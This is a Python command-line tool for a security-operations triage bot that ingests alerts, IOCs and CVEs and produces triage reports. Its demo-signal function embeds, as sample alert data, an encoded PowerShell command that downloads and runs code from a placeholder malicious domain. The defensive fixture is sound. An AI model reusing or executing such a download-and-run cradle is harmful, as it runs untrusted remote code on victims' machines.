"""Command-line interface for SOC Triage Bot.

CLI requirements (single-command demo):
  soc-agent triage [--signal-file alert.json | --ioc ... | --cve ... | --hunt-id ... | --user-report ...]
                   [--forecast on|off] [--output report.md] [--demo]
"""

import asyncio
import json
import sys
import uuid
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, Optional

import click

from .adapters import (
    CMDBAdapter,
    EDRAdapter,
    HistoricalQueryCapable,
    MockHistoricalAdapter,
    SIEMAdapter,
    ThreatIntelAdapter,
    VulnerabilityAdapter,
)
from .config.settings import get_settings
from .models import Signal, SignalSource, SignalType
from .models.signal import (
    ArtifactContext,
    DetectionContext,
    EntityBehaviorContext,
    VulnerabilityContext,
)
from .services import AIService, EnrichmentService, HistoricalDataService, TriageService
from .services.forecasting import MultiTrackHistoricalData
from .services.signal_router import SignalRouter

# =============================================================================
# BANNER & UI/UX UTILITIES
# =============================================================================


# ANSI color codes
class Colors:
    """ANSI color codes for terminal output."""

    HEADER = "\033[95m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    UNDERLINE = "\033[4m"
    RESET = "\033[0m"

    # Gradient-like colors
    PURPLE = "\033[38;5;135m"
    MAGENTA = "\033[38;5;199m"
    ORANGE = "\033[38;5;208m"
    TEAL = "\033[38;5;43m"
    WHITE = "\033[97m"


def supports_color() -> bool:
    """Check if terminal supports color output."""
    if not hasattr(sys.stdout, "isatty"):
        return False
    if not sys.stdout.isatty():
        return False
    return True


def c(text: str, color: str) -> str:
    """Colorize text if terminal supports it."""
    if supports_color():
        return f"{color}{text}{Colors.RESET}"
    return text


def show_banner(subtitle: str = "", show_version: bool = True):
    """Display the SOC Agent banner with optional subtitle.

    Args:
        subtitle: Optional subtitle to display below the banner
        show_version: Whether to show version info
    """
    version = "v1.0.0"

    # Clean, compact ASCII art banner
    click.echo("")
    click.echo(f"  {c('╭─────────────────────────────────────────────╮', Colors.CYAN)}")
    click.echo(
        f"  {c('│', Colors.CYAN)}                                             {c('│', Colors.CYAN)}"
    )
    click.echo(
        f"  {c('│', Colors.CYAN)}   {c('███████╗ ██████╗  ██████╗', Colors.PURPLE)}               {c('│', Colors.CYAN)}"
    )
    click.echo(
        f"  {c('│', Colors.CYAN)}   {c('██╔════╝██╔═══██╗██╔════╝', Colors.PURPLE)}               {c('│', Colors.CYAN)}"
    )
    click.echo(
        f"  {c('│', Colors.CYAN)}   {c('███████╗██║   ██║██║', Colors.PURPLE)}                    {c('│', Colors.CYAN)}"
    )
    click.echo(
        f"  {c('│', Colors.CYAN)}   {c('╚════██║██║   ██║██║', Colors.PURPLE)}                    {c('│', Colors.CYAN)}"
    )
    click.echo(
        f"  {c('│', Colors.CYAN)}   {c('███████║╚██████╔╝╚██████╗', Colors.PURPLE)}               {c('│', Colors.CYAN)}"
    )
    click.echo(
        f"  {c('│', Colors.CYAN)}   {c('╚══════╝ ╚═════╝  ╚═════╝', Colors.PURPLE)}               {c('│', Colors.CYAN)}"
    )
    click.echo(
        f"  {c('│', Colors.CYAN)}                                             {c('│', Colors.CYAN)}"
    )
    click.echo(
        f"  {c('│', Colors.CYAN)}     {c('A G E N T', Colors.MAGENTA + Colors.BOLD)}                           {c('│', Colors.CYAN)}"
    )
    click.echo(
        f"  {c('│', Colors.CYAN)}                                             {c('│', Colors.CYAN)}"
    )
    click.echo(f"  {c('╰─────────────────────────────────────────────╯', Colors.CYAN)}")

    # Tagline
    tagline = "🛡️  Autonomous Security Operations Center"
    click.echo(f"\n    {c(tagline, Colors.WHITE + Colors.BOLD)}")

    if show_version:
        click.echo(
            f"    {c(f'Version {version}', Colors.DIM)} | {c('SIEM-Agnostic • Async • AI-Ready', Colors.DIM)}"
        )

    if subtitle:
        click.echo(f"\n    {c('▸', Colors.TEAL)} {c(subtitle, Colors.WHITE)}")

    click.echo("")  # Empty line after banner


def show_section(title: str, icon: str = "▸"):
    """Display a section header."""
    click.echo(f"\n{c(icon, Colors.TEAL)} {c(title, Colors.BOLD + Colors.WHITE)}")
    click.echo(c("─" * 60, Colors.DIM))


def show_step(step_num: int, description: str, status: str = "running"):
    """Display a step indicator."""
    icons = {
        "running": c("◐", Colors.YELLOW),
        "done": c("✓", Colors.GREEN),
        "error": c("✗", Colors.RED),
        "skip": c("○", Colors.DIM),
    }
    icon = icons.get(status, icons["running"])
    click.echo(f"  {icon} {c(f'Step {step_num}:', Colors.BOLD)} {description}")


def show_success(message: str):
    """Display a success message."""
    click.echo(f"\n  {c('✓', Colors.GREEN)} {c(message, Colors.GREEN)}")


def show_error(message: str):
    """Display an error message."""
    click.echo(f"\n  {c('✗', Colors.RED)} {c(message, Colors.RED)}")


def show_info(message: str):
    """Display an info message."""
    click.echo(f"  {c('ℹ', Colors.BLUE)} {message}")


def show_warning(message: str):
    """Display a warning message."""
    click.echo(f"  {c('⚠', Colors.YELLOW)} {c(message, Colors.YELLOW)}")


def show_divider():
    """Display a subtle divider."""
    click.echo(c("  " + "─" * 56, Colors.DIM))


# =============================================================================
# SERVICE SETUP
# =============================================================================


def setup_triage_service(ai_enabled: bool = False, demo_mode: bool = False):
    """Initialize the triage service.

    Args:
        ai_enabled: Whether to enable AI overlay generation.
        demo_mode: Whether to run in demo mode with mock historical data.
    """
    adapters = [
        SIEMAdapter(),
        EDRAdapter(),
        ThreatIntelAdapter(),
        VulnerabilityAdapter(),
        CMDBAdapter(),
    ]

    enrichment_service = EnrichmentService(adapters)

    # Create AI service if enabled
    ai_service = None
    if ai_enabled:
        settings = get_settings()
        ai_service = AIService.from_settings(settings)

    # Create historical data service based on mode
    historical_data_service = None
    if demo_mode:
        # Demo mode: always use mock adapter
        historical_data_service = HistoricalDataService([MockHistoricalAdapter()])
    else:
        # Live mode: get adapters that support historical queries
        capable_adapters = []
        for adapter in adapters:
            # Check if adapter implements HistoricalQueryCapable protocol
            if hasattr(adapter, "supports_historical_query") and callable(
                getattr(adapter, "supports_historical_query")
            ):
                try:
                    if adapter.supports_historical_query():
                        capable_adapters.append(adapter)
                except Exception:
                    pass

        # Create service if we have capable adapters
        if capable_adapters:
            historical_data_service = HistoricalDataService(capable_adapters)

    return TriageService(
        enrichment_service=enrichment_service,
        ai_service=ai_service,
        historical_data_service=historical_data_service,
    )


@click.group(invoke_without_command=True)
@click.version_option(version="1.0.0", prog_name="SOC Agent")
@click.pass_context
def main(ctx):
    """SOC Agent - Autonomous Security Operations Center Agent.

    An async, SIEM-agnostic triage agent for security signal analysis,
    enrichment, classification, and response recommendations.
    """
    # Show banner when no command is specified
    if ctx.invoked_subcommand is None:
        show_banner()
        click.echo(c("  Available Commands:", Colors.BOLD))
        click.echo(f"    {c('triage', Colors.CYAN)}    - Triage a security signal")
        click.echo(f"    {c('serve', Colors.CYAN)}     - Start the REST API server")
        click.echo(
            f"    {c('create', Colors.CYAN)}    - Create a new signal interactively"
        )
        click.echo(f"    {c('validate', Colors.CYAN)}  - Validate a signal JSON file")
        click.echo(f"    {c('health', Colors.CYAN)}    - Check adapter health status")
        click.echo(
            f"\n  {c('Run', Colors.DIM)} {c('soc-agent <command> --help', Colors.WHITE)} {c('for more info', Colors.DIM)}\n"
        )


@main.command()
@click.option("--host", default="0.0.0.0", help="Host to bind to")
@click.option("--port", default=8000, type=int, help="Port to bind to")
@click.option("--reload", is_flag=True, help="Enable auto-reload for development")
def serve(host: str, port: int, reload: bool):
    """Start the REST API server."""
    import uvicorn

    show_banner(subtitle="REST API Server")

    show_section("Server Configuration")
    show_info(f"Host: {c(host, Colors.CYAN)}")
    show_info(f"Port: {c(str(port), Colors.CYAN)}")
    show_info(
        f"Auto-reload: {c('enabled', Colors.GREEN) if reload else c('disabled', Colors.DIM)}"
    )

    show_divider()
    show_step(
        1,
        f"Starting Uvicorn server on {c(f'http://{host}:{port}', Colors.UNDERLINE)}",
        "running",
    )

    uvicorn.run("soc_triage_bot.api:app", host=host, port=port, reload=reload)


@main.command()
@click.option(
    "--signal-file",
    type=click.Path(exists=True),
    help="Signal JSON file (auto-detects SOAR container or standard signal)",
)
@click.option(
    "--soar-container", type=click.Path(exists=True), help="SOAR container JSON file"
)
@click.option(
    "--soar-id", type=str, help="SOAR case ID to fetch (requires SOAR adapter)"
)
@click.option("--siem-alert", type=click.Path(exists=True), help="SIEM alert JSON file")
@click.option(
    "--siem-alert-id", type=str, help="SIEM alert ID to fetch (requires SIEM adapter)"
)
@click.option(
    "--ioc", type=str, help="IOC string (format: type=value, e.g., domain=evil.com)"
)
@click.option("--cve", type=str, help="CVE identifier (e.g., CVE-2024-12345)")
@click.option("--hunt-id", type=str, help="Hunt finding ID (e.g., HUNT-007)")
@click.option(
    "--user-report", type=click.Path(exists=True), help="User report text file"
)
@click.option(
    "--historical-data", type=click.Path(exists=True), help="Historical data JSON file"
)
@click.option(
    "--forecast",
    type=click.Choice(["on", "off"]),
    default="on",
    help="Enable/disable ETS forecasting",
)
@click.option("--output", "-o", type=click.Path(), help="Output file for report")
@click.option(
    "--format",
    "-f",
    type=click.Choice(["markdown", "json"]),
    default="markdown",
    help="Output format",
)
@click.option("--demo", is_flag=True, help="Run in demo mode with sample data")
@click.option(
    "--ai-service/--no-ai-service",
    default=False,
    help="Enable/disable AI overlay generation (requires AI provider config)",
)
def triage(
    signal_file: Optional[str],
    soar_container: Optional[str],
    soar_id: Optional[str],
    siem_alert: Optional[str],
    siem_alert_id: Optional[str],
    ioc: Optional[str],
    cve: Optional[str],
    hunt_id: Optional[str],
    user_report: Optional[str],
    historical_data: Optional[str],
    forecast: str,
    output: Optional[str],
    format: str,
    demo: bool,
    ai_service: bool,
):
    """Triage a security signal from various input sources.

    Input can be one of:
    - --signal-file: Signal JSON file (auto-detects SOAR container or standard signal)
    - --soar-container: SOAR container JSON file (Phantom/Splunk SOAR format)
    - --soar-id: SOAR case ID to fetch from SOAR platform
    - --siem-alert: SIEM alert JSON file
    - --siem-alert-id: SIEM alert ID to fetch from SIEM
    - --ioc: IOC string (type=value format)
    - --cve: CVE identifier
    - --hunt-id: Hunt finding ID
    - --user-report: User report text file
    - --demo: Generate sample SIEM alert for demonstration

    Examples:
        soc-agent triage --signal-file alert.json
        soc-agent triage --soar-container phantom_case.json
        soc-agent triage --soar-id 12345
        soc-agent triage --siem-alert splunk_notable.json
        soc-agent triage --siem-alert-id "alert-abc-123"
        soc-agent triage --ioc "domain=evil.com"
        soc-agent triage --cve CVE-2024-12345
        soc-agent triage --hunt-id HUNT-007
        soc-agent triage --user-report report.txt
        soc-agent triage --demo --output report.md
    """
    # Show banner
    show_banner(subtitle="Signal Triage & Analysis")

    # Step 0: Determine input source and build signal
    signal = None
    hist_data = None
    input_source = ""
    signal_router = SignalRouter()

    show_section("Input Processing")

    if demo:
        # Demo mode: generate sample SIEM alert
        signal = create_demo_signal()
        input_source = "demo"
        show_info(f"Demo mode: Generated sample {c('SIEM_ALERT', Colors.CYAN)}")
    elif soar_container:
        # Load SOAR container JSON
        with open(soar_container) as f:
            soar_data = json.load(f)
        signal = signal_router.detect_and_parse_soar_container(soar_data)
        if not signal:
            show_error("File does not appear to be a valid SOAR container")
            raise click.UsageError(f"Invalid SOAR container format in {soar_container}")
        input_source = f"SOAR container: {Path(soar_container).name}"
        show_info(
            f"Loaded SOAR container from {c(Path(soar_container).name, Colors.CYAN)}"
        )
        show_info(
            f"Container ID: {c(signal.metadata.get('soar_id', 'unknown'), Colors.WHITE)}"
        )
    elif soar_id:
        # Fetch SOAR case by ID (uses SOARAdapter)
        show_info(f"Fetching SOAR case from platform...")
        signal = create_signal_from_soar_id(soar_id)
        input_source = f"SOAR ID: {soar_id}"
        if signal.tags and "fetch-failed" in signal.tags:
            show_warning(
                "SOAR fetch returned mock data (adapter configuration needed for live data)"
            )
        else:
            show_info(f"Fetched SOAR case: {c(soar_id, Colors.GREEN)}")
    elif siem_alert:
        # Load SIEM alert JSON
        with open(siem_alert) as f:
            alert_data = json.load(f)
        signal = parse_signal_from_json(alert_data)
        input_source = f"SIEM alert: {Path(siem_alert).name}"
        show_info(f"Loaded SIEM alert from {c(Path(siem_alert).name, Colors.CYAN)}")
    elif siem_alert_id:
        # Fetch SIEM alert by ID (uses SIEMAdapter)
        show_info(f"Fetching SIEM alert from platform...")
        signal = create_signal_from_siem_alert_id(siem_alert_id)
        input_source = f"SIEM alert ID: {siem_alert_id}"
        if signal.tags and "fetch-failed" in signal.tags:
            show_warning(
                "SIEM fetch returned mock data (adapter configuration needed for live data)"
            )
        else:
            show_info(f"Fetched SIEM alert: {c(siem_alert_id, Colors.GREEN)}")
    elif signal_file:
        # Load from JSON file (auto-detects SOAR container or standard signal)
        with open(signal_file) as f:
            signal_data = json.load(f)
        # Try SOAR container detection first
        signal = signal_router.detect_and_parse_soar_container(signal_data)
        if signal:
            input_source = f"SOAR container (auto-detected): {Path(signal_file).name}"
            show_info(
                f"Auto-detected SOAR container from {c(Path(signal_file).name, Colors.CYAN)}"
            )
        else:
            # Fall back to standard signal parsing
            signal = parse_signal_from_json(signal_data)
            input_source = f"file: {Path(signal_file).name}"
            show_info(f"Loaded signal from {c(Path(signal_file).name, Colors.CYAN)}")
    elif ioc:
        # Create IOC signal from string
        signal = create_signal_from_ioc(ioc)
        input_source = f"IOC: {ioc}"
        show_info(f"Created IOC signal: {c(ioc, Colors.CYAN)}")
    elif cve:
        # Create CVE signal
        signal = create_signal_from_cve(cve)
        input_source = f"CVE: {cve}"
        show_info(f"Created CVE signal: {c(cve, Colors.CYAN)}")
    elif hunt_id:
        # Create hunt finding signal
        signal = create_signal_from_hunt(hunt_id)
        input_source = f"Hunt: {hunt_id}"
        show_info(f"Created Hunt signal: {c(hunt_id, Colors.CYAN)}")
    elif user_report:
        # Create user report signal from file
        signal = create_signal_from_user_report(user_report)
        input_source = f"report: {Path(user_report).name}"
        show_info(
            f"Created signal from user report: {c(Path(user_report).name, Colors.CYAN)}"
        )
    else:
        show_error("No input specified!")
        raise click.UsageError(
            "Must specify one of: --signal-file, --soar-container, --soar-id, --siem-alert, --siem-alert-id, --ioc, --cve, --hunt-id, --user-report, or --demo"
        )

    # Load historical data if provided
    if historical_data:
        with open(historical_data) as f:
            hist_data = json.load(f)
        show_info(
            f"Loaded historical data from {c(Path(historical_data).name, Colors.CYAN)}"
        )

    # Step 1: Normalize signal
    signal = normalize_signal_cli(signal)

    # Configure forecast option
    forecast_enabled = forecast == "on"

    # Show triage details
    show_section("Triage Execution")
    show_info(f"Signal ID: {c(signal.signal_id, Colors.WHITE + Colors.BOLD)}")
    show_info(f"Input: {c(input_source, Colors.CYAN)}")
    show_info(f"Type: {c(signal.signal_type.value.upper(), Colors.CYAN)}")
    show_info(
        f"Severity: {c(signal.severity.upper(), Colors.YELLOW if signal.severity in ['high', 'critical'] else Colors.WHITE)}"
    )
    show_info(
        f"Forecast: {c('enabled', Colors.GREEN) if forecast_enabled else c('disabled', Colors.DIM)}"
    )

    show_divider()

    # Execute triage with step indicators
    show_step(1, "Running concurrent enrichments...", "running")
    show_step(
        2,
        (
            "Fetching historical data..."
            if demo
            else "Checking historical data sources..."
        ),
        "running" if forecast_enabled else "skip",
    )
    show_step(
        3, "Running ETS forecasting...", "running" if forecast_enabled else "skip"
    )
    show_step(4, "Finding similar cases...", "running")
    show_step(5, "Classifying signal...", "running")
    show_step(6, "Generating recommendations...", "running")
    if ai_service:
        show_step(7, "Generating AI overlay...", "running")

    result = asyncio.run(
        execute_triage(
            signal, hist_data, forecast_enabled, ai_enabled=ai_service, demo_mode=demo
        )
    )

    # Show completion
    duration_sec = result.duration_ms / 1000 if result.duration_ms else 0
    show_success(f"Triage completed in {c(f'{duration_sec:.2f}s', Colors.WHITE)}")

    # Output results
    if format == "json":
        output_data = format_result_as_json(result)
        output_text = json.dumps(output_data, indent=2, default=str)
    else:
        output_text = result.report

    if output:
        with open(output, "w") as f:
            f.write(output_text)
        show_section("Output")
        show_success(f"Report written to: {c(output, Colors.CYAN + Colors.UNDERLINE)}")
    else:
        show_section("Report Output")
        click.echo("")
        click.echo(output_text)


@main.command()
@click.option(
    "--type",
    "signal_type",
    type=click.Choice(["siem_alert", "ioc", "cve", "hunt", "user_report"]),
    default="siem_alert",
    help="Signal type",
)
@click.option("--title", prompt=True, help="Signal title")
@click.option("--description", prompt=True, help="Signal description")
@click.option(
    "--severity",
    type=click.Choice(["low", "medium", "high", "critical"]),
    default="medium",
    help="Severity level",
)
@click.option("--output", "-o", type=click.Path(), help="Output file for report")
def create(
    signal_type: str, title: str, description: str, severity: str, output: Optional[str]
):
    """Create and triage a new signal interactively."""
    show_banner(subtitle="Interactive Signal Creation")

    show_section("Signal Details")
    # Create signal
    signal = Signal(
        signal_id=f"sig-{datetime.utcnow().strftime('%Y%m%d%H%M%S')}",
        signal_type=SignalType(signal_type),
        timestamp=datetime.utcnow(),
        source=SignalSource(system="cli", rule_name="manual"),
        title=title,
        description=description,
        severity=severity,
        entities={},
        tags=[],
        raw_data={},
    )

    show_success(f"Created signal: {c(signal.signal_id, Colors.CYAN)}")
    show_info(f"Type: {c(signal_type.upper(), Colors.WHITE)}")
    show_info(
        f"Severity: {c(severity.upper(), Colors.YELLOW if severity in ['high', 'critical'] else Colors.WHITE)}"
    )

    show_divider()
    show_section("Running Triage")

    # Execute triage (with forecast enabled by default)
    result = asyncio.run(
        execute_triage(signal, None, forecast_enabled=True, demo_mode=False)
    )

    # Output report
    show_section("Output")
    if output:
        with open(output, "w") as f:
            f.write(result.report)
        show_success(f"Report written to: {c(output, Colors.CYAN + Colors.UNDERLINE)}")
    else:
        click.echo("")
        click.echo(result.report)


@main.command()
def health():
    """Check health of all adapters."""
    show_banner(subtitle="System Health Check")

    adapters = [
        SIEMAdapter(),
        EDRAdapter(),
        ThreatIntelAdapter(),
        VulnerabilityAdapter(),
        CMDBAdapter(),
    ]

    enrichment_service = EnrichmentService(adapters)

    show_section("Adapter Status")
    show_step(1, "Checking adapter connectivity...", "running")

    health_status = asyncio.run(enrichment_service.health_check())

    click.echo("")
    for adapter_name, is_healthy in health_status.items():
        if is_healthy:
            click.echo(
                f"  {c('●', Colors.GREEN)} {adapter_name}: {c('healthy', Colors.GREEN)}"
            )
        else:
            click.echo(
                f"  {c('●', Colors.RED)} {adapter_name}: {c('unhealthy', Colors.RED)}"
            )

    healthy_count = sum(1 for h in health_status.values() if h)
    total_count = len(health_status)

    show_divider()
    if healthy_count == total_count:
        show_success(f"All {total_count} adapters are healthy")
    else:
        show_warning(f"{healthy_count}/{total_count} adapters healthy")


@main.command()
@click.argument("signal_file", type=click.Path(exists=True))
def validate(signal_file: str):
    """Validate a signal JSON file."""
    show_banner(subtitle="Signal Validation")

    show_section("Validating Signal")
    show_info(f"File: {c(signal_file, Colors.CYAN)}")

    try:
        with open(signal_file) as f:
            signal_data = json.load(f)

        signal = parse_signal_from_json(signal_data)

        show_divider()
        show_success("Signal is valid!")
        click.echo("")
        click.echo(
            f"  {c('Signal ID:', Colors.DIM)} {c(signal.signal_id, Colors.WHITE)}"
        )
        click.echo(
            f"  {c('Type:', Colors.DIM)} {c(signal.signal_type.value.upper(), Colors.CYAN)}"
        )
        click.echo(
            f"  {c('Severity:', Colors.DIM)} {c(signal.severity.upper(), Colors.YELLOW if signal.severity in ['high', 'critical'] else Colors.WHITE)}"
        )
        click.echo(
            f"  {c('Entities:', Colors.DIM)} {c(str(len(signal.entities)), Colors.WHITE)} types"
        )
        click.echo("")
    except json.JSONDecodeError as e:
        show_divider()
        show_error(f"Invalid JSON: {e}")
        raise click.Abort()
    except Exception as e:
        show_divider()
        show_error(f"Validation failed: {e}")
        raise click.Abort()


async def execute_triage(
    signal: Signal,
    historical_data: Optional[MultiTrackHistoricalData] = None,
    forecast_enabled: bool = True,
    ai_enabled: bool = False,
    demo_mode: bool = False,
):
    """Execute triage asynchronously using the extended multi-track triage.

    Args:
        signal: Normalized signal to triage
        historical_data: Optional multi-track historical data for forecasting
        forecast_enabled: Whether to run ETS forecasting
        ai_enabled: Whether to enable AI overlay generation
        demo_mode: Whether to run in demo mode with mock historical data
    """
    triage_service = setup_triage_service(ai_enabled=ai_enabled, demo_mode=demo_mode)

    result = await triage_service.triage_extended(
        signal, historical_data, forecast_enabled=forecast_enabled
    )
    return result


# =============================================================================
# SIGNAL FACTORY FUNCTIONS
# =============================================================================


def create_demo_signal() -> Signal:
    """Create a sample SIEM alert for demonstration."""
    return Signal(
        signal_id=f"demo-{uuid.uuid4().hex[:8]}",
        signal_type=SignalType.SIEM_ALERT,
        timestamp=datetime.utcnow(),
        source=SignalSource(
            system="splunk",
            rule_id="rule-demo-001",
            rule_name="Suspicious PowerShell Execution",
        ),
        title="Suspicious PowerShell Execution Detected",
        description="PowerShell process launched with encoded command and network activity to known malicious domain.",
        severity="high",
        entities={
            "hostname": ["workstation-demo-01"],
            "username": ["demo-admin"],
            "ip": ["192.0.2.100", "198.51.100.50"],
        },
        indicators={"domain": "evil-demo.com", "ip": "198.51.100.50"},
        tags=["malware", "powershell", "c2"],
        raw_data={
            "process_name": "powershell.exe",
            "command_line": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAtAGQAZQBtAG8ALgBjAG8AbQAnACkA",
            "parent_process": "explorer.exe",
        },
        detection_context=DetectionContext(
            rule_id="rule-demo-001",
            detection_name="Suspicious PowerShell Execution",
            mitre_tactics=["execution", "command_and_control"],
            mitre_techniques=["T1059.001", "T1071.001"],
        ),
        entity_context=EntityBehaviorContext(
            hostname="workstation-demo-01",
            username="demo-admin",
            src_ip="192.0.2.100",
        ),
        artifact_context=ArtifactContext(
            domain="evil-demo.com",
            ip="198.51.100.50",
            process_name="powershell.exe",
        ),
    )


def create_signal_from_ioc(ioc_string: str) -> Signal:
    """Create an IOC signal from a type=value string.

    Args:
        ioc_string: IOC in format "type=value" (e.g., "domain=evil.com")

    Returns:
        Signal with IOC type and populated artifact context
    """
    # Parse IOC string
    if "=" not in ioc_string:
        raise click.UsageError(
            f"Invalid IOC format: '{ioc_string}'. Expected type=value (e.g., domain=evil.com)"
        )

    ioc_type, ioc_value = ioc_string.split("=", 1)
    ioc_type = ioc_type.strip().lower()
    ioc_value = ioc_value.strip()

    # Build artifact context based on IOC type
    artifact_context = ArtifactContext()
    if ioc_type == "domain":
        artifact_context.domain = ioc_value
    elif ioc_type == "ip":
        artifact_context.ip = ioc_value
    elif ioc_type in ("sha256", "hash"):
        artifact_context.sha256 = ioc_value
    elif ioc_type == "md5":
        artifact_context.md5 = ioc_value
    elif ioc_type == "url":
        artifact_context.url = ioc_value
    else:
        # Generic indicator
        pass

    return Signal(
        signal_id=f"ioc-{uuid.uuid4().hex[:8]}",
        signal_type=SignalType.IOC,
        timestamp=datetime.utcnow(),
        source=SignalSource(system="cli", rule_name="ioc-lookup"),
        title=f"IOC Lookup: {ioc_type}={ioc_value}",
        description=f"Manual IOC lookup for {ioc_type}: {ioc_value}",
        severity="medium",
        indicators={ioc_type: ioc_value},
        artifact_context=artifact_context,
        tags=["ioc", ioc_type],
        raw_data={"ioc_type": ioc_type, "ioc_value": ioc_value},
    )


def create_signal_from_soar_id(soar_id: str) -> Signal:
    """Fetch a signal from SOAR case ID using SOARAdapter.

    Args:
        soar_id: SOAR case/container ID

    Returns:
        Signal with full SOAR case data
    """
    from .adapters.soar import SOARAdapter  # type: ignore

    # Create adapter and fetch case
    soar_adapter = SOARAdapter()
    signal = asyncio.run(soar_adapter.fetch_case_by_id(soar_id))

    if not signal:
        # Fallback: create minimal signal if fetch fails
        signal = Signal(
            signal_id=f"soar-{soar_id}",
            signal_type=SignalType.SIEM_ALERT,
            timestamp=datetime.utcnow(),
            source=SignalSource(
                system="soar",
                rule_name=f"SOAR Case {soar_id}",
                rule_id=soar_id,
            ),
            title=f"SOAR Case {soar_id}",
            description=f"Signal created from SOAR case ID: {soar_id}. Case fetch failed.",
            severity="medium",
            entities={},
            tags=["soar", "fetch-failed"],
            raw_data={"soar_id": soar_id},
            metadata={"soar_id": soar_id, "fetch_status": "failed"},
        )

    return signal


def create_signal_from_siem_alert_id(alert_id: str) -> Signal:
    """Fetch a signal from SIEM alert ID using SIEMAdapter.

      Args:
          alert_id: SIEM alert/notable event ID
    # type: ignore
      Returns:
          Signal with full SIEM alert data
    """
    from .adapters.siem import SIEMAdapter

    # Create adapter and fetch alert
    siem_adapter = SIEMAdapter()
    signal = asyncio.run(siem_adapter.fetch_alert_by_id(alert_id))

    if not signal:
        # Fallback: create minimal signal if fetch fails
        signal = Signal(
            signal_id=f"siem-{alert_id}",
            signal_type=SignalType.SIEM_ALERT,
            timestamp=datetime.utcnow(),
            source=SignalSource(
                system="siem",
                rule_name=f"Alert {alert_id}",
                rule_id=alert_id,
            ),
            title=f"SIEM Alert {alert_id}",
            description=f"Signal created from SIEM alert ID: {alert_id}. Alert fetch failed.",
            severity="medium",
            entities={},
            tags=["siem", "fetch-failed"],
            raw_data={"alert_id": alert_id},
            metadata={"alert_id": alert_id, "fetch_status": "failed"},
        )

    return signal


def create_signal_from_cve(cve_id: str) -> Signal:
    """Create a CVE/vulnerability signal.

    Args:
        cve_id: CVE identifier (e.g., CVE-2024-12345)

    Returns:
        Signal with CVE type and populated vulnerability context
    """
    # Normalize CVE ID
    cve_id = cve_id.upper()
    if not cve_id.startswith("CVE-"):
        cve_id = f"CVE-{cve_id}"

    return Signal(
        signal_id=f"vuln-{uuid.uuid4().hex[:8]}",
        signal_type=SignalType.CVE,
        timestamp=datetime.utcnow(),
        source=SignalSource(system="cli", rule_name="cve-lookup"),
        title=f"Vulnerability Report: {cve_id}",
        description=f"Vulnerability lookup for {cve_id}",
        severity="high",  # Default high for vulnerabilities
        vuln_context=VulnerabilityContext(cve_id=cve_id),
        tags=["vulnerability", "cve"],
        raw_data={"cve_id": cve_id},
    )


def create_signal_from_hunt(hunt_id: str) -> Signal:
    """Create a hunt finding signal.

    Args:
        hunt_id: Hunt finding identifier (e.g., HUNT-007)

    Returns:
        Signal with HUNT type
    """
    return Signal(
        signal_id=f"hunt-{uuid.uuid4().hex[:8]}",
        signal_type=SignalType.HUNT,
        timestamp=datetime.utcnow(),
        source=SignalSource(system="threat-hunting", rule_id=hunt_id),
        title=f"Hunt Finding: {hunt_id}",
        description=f"Threat hunting finding {hunt_id}",
        severity="medium",
        tags=["hunt", "proactive"],
        raw_data={"hunt_id": hunt_id},
        metadata={"hunt_id": hunt_id},
    )


def create_signal_from_user_report(report_file: str) -> Signal:
    """Create a user report signal from a text file.

    Args:
        report_file: Path to user report text file

    Returns:
        Signal with USER_REPORT type
    """
    with open(report_file) as f:
        report_content = f.read()

    # Extract first line as title, rest as description
    lines = report_content.strip().split("\n")
    title = lines[0] if lines else "User Report"
    description = "\n".join(lines[1:]) if len(lines) > 1 else report_content

    return Signal(
        signal_id=f"user-{uuid.uuid4().hex[:8]}",
        signal_type=SignalType.USER_REPORT,
        timestamp=datetime.utcnow(),
        source=SignalSource(system="user-report", rule_name="user-submitted"),
        title=title[:100],  # Truncate long titles
        description=description,
        severity="medium",  # Default medium for user reports
        tags=["user-report"],
        raw_data={"report_content": report_content, "source_file": report_file},
    )


# =============================================================================
# NORMALIZATION
# =============================================================================


def normalize_signal_cli(signal: Signal) -> Signal:
    """Normalize a signal for CLI processing - delegated to SignalRouter.

    DEPRECATED: Use SignalRouter directly. This wrapper exists for backward compatibility.
    """
    router = SignalRouter()
    return router.route(signal)


def _determine_signal_subtype(signal: Signal) -> str:
    """DEPRECATED: Moved to SignalRouter._determine_signal_subtype."""
    router = SignalRouter()
    return router._determine_signal_subtype(signal)


def _select_entity_focus(signal: Signal, entities: Dict[str, Any]) -> str:
    """DEPRECATED: Moved to SignalRouter._select_entity_focus."""
    router = SignalRouter()
    return router._select_entity_focus(signal, entities)


def detect_and_parse_soar_container(data: dict) -> Optional[Signal]:
    """DEPRECATED: Moved to SignalRouter.detect_and_parse_soar_container."""
    router = SignalRouter()
    return router.detect_and_parse_soar_container(data)


def parse_signal_from_json(data: dict) -> Signal:
    """Parse a signal from JSON data - delegated to SignalRouter.

    DEPRECATED: Use SignalRouter directly. This wrapper exists for backward compatibility.
    """
    router = SignalRouter()
    return router.parse_signal_from_json(data)


def format_result_as_json(result):
    """Format triage result as JSON."""
    return {
        "signal_id": result.signal.signal_id,
        "classification": {
            "label": result.classification.label.value,
            "confidence": result.classification.confidence,
            "reasoning": result.classification.reasoning,
            "factors": result.classification.factors,
        },
        "actions": [
            {
                "action_id": action.action_id,
                "type": action.action_type.value,
                "priority": action.priority,
                "title": action.title,
                "description": action.description,
                "source": action.source,
                "confidence": action.confidence,
            }
            for action in result.actions
        ],
        "enrichments": {
            name: {"status": enrich.status.value, "duration_ms": enrich.duration_ms}
            for name, enrich in result.enrichments.items()
        },
        "duration_ms": result.duration_ms,
        "timestamp": result.timestamp.isoformat(),
    }


if __name__ == "__main__":
    main()
